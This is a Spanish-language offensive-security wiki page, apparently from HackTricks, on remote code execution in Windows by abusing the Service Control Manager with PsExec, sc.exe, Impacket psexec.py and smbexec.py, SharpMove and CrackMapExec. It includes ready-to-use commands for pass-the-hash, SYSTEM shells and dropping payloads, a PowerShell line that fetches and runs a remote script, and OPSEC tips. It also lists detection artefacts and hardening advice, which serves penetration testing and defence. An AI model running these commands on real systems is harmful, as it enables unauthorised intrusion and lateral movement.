# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## Cómo funcionan

Estas técnicas abusan del Administrador de Control de Servicios de Windows (SCM) de forma remota a través de SMB/RPC para ejecutar comandos en un host objetivo. El flujo común es:

1. Autenticarse en el objetivo y acceder al recurso compartido ADMIN$ a través de SMB (TCP/445).
2. Copiar un ejecutable o especificar una línea de comando LOLBAS que el servicio ejecutará.
3. Crear un servicio de forma remota a través de SCM (MS-SCMR sobre \PIPE\svcctl) apuntando a ese comando o binario.
4. Iniciar el servicio para ejecutar la carga útil y opcionalmente capturar stdin/stdout a través de un pipe con nombre.
5. Detener el servicio y limpiar (eliminar el servicio y cualquier binario dejado).

Requisitos/prerrequisitos:
- Administrador local en el objetivo (SeCreateServicePrivilege) o derechos explícitos de creación de servicios en el objetivo.
- SMB (445) accesible y recurso compartido ADMIN$ disponible; Gestión de Servicios Remotos permitida a través del firewall del host.
- Restricciones Remotas de UAC: con cuentas locales, el filtrado de tokens puede bloquear el acceso administrativo a través de la red a menos que se use el Administrador incorporado o LocalAccountTokenFilterPolicy=1.
- Kerberos vs NTLM: usar un nombre de host/FQDN habilita Kerberos; conectarse por IP a menudo vuelve a NTLM (y puede ser bloqueado en entornos endurecidos).

### ScExec/WinExec manual a través de sc.exe

Lo siguiente muestra un enfoque mínimo de creación de servicios. La imagen del servicio puede ser un EXE dejado o un LOLBAS como cmd.exe o powershell.exe.
```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```
Notas:
- Espere un error de tiempo de espera al iniciar un EXE que no sea un servicio; la ejecución aún ocurre.
- Para ser más amigable con OPSEC, prefiera comandos sin archivos (cmd /c, powershell -enc) o elimine los artefactos dejados.

Encuentre pasos más detallados en: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/

## Herramientas y ejemplos

### Sysinternals PsExec.exe

- Herramienta clásica de administración que utiliza SMB para dejar PSEXESVC.exe en ADMIN$, instala un servicio temporal (nombre predeterminado PSEXESVC) y hace proxy de I/O a través de tuberías con nombre.
- Ejemplos de uso:
```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```
- Puedes lanzar directamente desde Sysinternals Live a través de WebDAV:
```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```
OPSEC
- Deja eventos de instalación/desinstalación de servicios (el nombre del servicio suele ser PSEXESVC a menos que se use -r) y crea C:\Windows\PSEXESVC.exe durante la ejecución.

### Impacket psexec.py (similar a PsExec)

- Utiliza un servicio embebido similar a RemCom. Deja un binario de servicio transitorio (nombre comúnmente aleatorio) a través de ADMIN$, crea un servicio (por defecto a menudo RemComSvc) y hace proxy de I/O a través de un pipe con nombre.
```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```
Artifacts
- EXE temporal en C:\Windows\ (8 caracteres aleatorios). El nombre del servicio se establece de forma predeterminada en RemComSvc a menos que se sobrescriba.

### Impacket smbexec.py (SMBExec)

- Crea un servicio temporal que genera cmd.exe y utiliza un pipe con nombre para I/O. Generalmente evita soltar una carga útil EXE completa; la ejecución de comandos es semi-interactiva.
```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```
### SharpLateral y SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) implementa varios métodos de movimiento lateral, incluyendo la ejecución basada en servicios.
```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```
- [SharpMove](https://github.com/0xthirteen/SharpMove) incluye modificación/creación de servicios para ejecutar un comando de forma remota.
```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```
- También puedes usar CrackMapExec para ejecutar a través de diferentes backends (psexec/smbexec/wmiexec):
```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```
## OPSEC, detección y artefactos

Artefactos típicos de host/red al usar técnicas similares a PsExec:
- Seguridad 4624 (Tipo de inicio de sesión 3) y 4672 (Privilegios especiales) en el objetivo para la cuenta de administrador utilizada.
- Seguridad 5140/5145 Eventos de Compartición de Archivos y Detalles de Compartición de Archivos mostrando acceso ADMIN$ y creación/escritura de binarios de servicio (por ejemplo, PSEXESVC.exe o .exe aleatorio de 8 caracteres).
- Seguridad 7045 Instalación de Servicio en el objetivo: nombres de servicio como PSEXESVC, RemComSvc, o personalizados (-r / -service-name).
- Sysmon 1 (Creación de Proceso) para services.exe o la imagen del servicio, 3 (Conexión de Red), 11 (Creación de Archivo) en C:\Windows\, 17/18 (Tubería Creada/Conectada) para tuberías como \\.\pipe\psexesvc, \\.\pipe\remcom_*, o equivalentes aleatorios.
- Artefacto de Registro para EULA de Sysinternals: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 en el host del operador (si no está suprimido).

Ideas de caza
- Alertar sobre instalaciones de servicios donde el ImagePath incluye cmd.exe /c, powershell.exe, o ubicaciones TEMP.
- Buscar creaciones de procesos donde ParentImage sea C:\Windows\PSEXESVC.exe o hijos de services.exe ejecutándose como LOCAL SYSTEM ejecutando shells.
- Marcar tuberías nombradas que terminen en -stdin/-stdout/-stderr o nombres de tuberías de clon de PsExec bien conocidos.

## Solución de problemas de fallos comunes
- Acceso denegado (5) al crear servicios: no es realmente administrador local, restricciones remotas de UAC para cuentas locales, o protección contra manipulación de EDR en la ruta del binario del servicio.
- La ruta de red no fue encontrada (53) o no se pudo conectar a ADMIN$: firewall bloqueando SMB/RPC o comparticiones de administrador deshabilitadas.
- Kerberos falla pero NTLM está bloqueado: conectarse usando nombre de host/FQDN (no IP), asegurar SPNs adecuados, o proporcionar -k/-no-pass con tickets al usar Impacket.
- El inicio del servicio se agota pero la carga útil se ejecutó: esperado si no es un binario de servicio real; capturar salida a un archivo o usar smbexec para I/O en vivo.

## Notas de endurecimiento
- Windows 11 24H2 y Windows Server 2025 requieren firma SMB por defecto para conexiones salientes (y Windows 11 entrantes). Esto no interrumpe el uso legítimo de PsExec con credenciales válidas, pero previene el abuso de retransmisión SMB no firmada y puede afectar a dispositivos que no soportan la firma.
- El nuevo bloqueo de NTLM del cliente SMB (Windows 11 24H2/Server 2025) puede prevenir la retroceso de NTLM al conectarse por IP o a servidores no Kerberos. En entornos endurecidos, esto romperá PsExec/SMBExec basado en NTLM; use Kerberos (nombre de host/FQDN) o configure excepciones si es legítimamente necesario.
- Principio de menor privilegio: minimizar la membresía de administrador local, preferir Just-in-Time/Just-Enough Admin, hacer cumplir LAPS, y monitorear/alertar sobre instalaciones de servicio 7045.

## Ver también

- Ejecución remota basada en WMI (a menudo más sin archivos):

{{#ref}}
./wmiexec.md
{{#endref}}

- Ejecución remota basada en WinRM:

{{#ref}}
./winrm.md
{{#endref}}



## Referencias

- PsExec - Sysinternals | Microsoft Learn: https://learn.microsoft.com/sysinternals/downloads/psexec
- Endurecimiento de seguridad SMB en Windows Server 2025 y Windows 11 (firma por defecto, bloqueo de NTLM): https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591

{{#include ../../banners/hacktricks-training.md}}
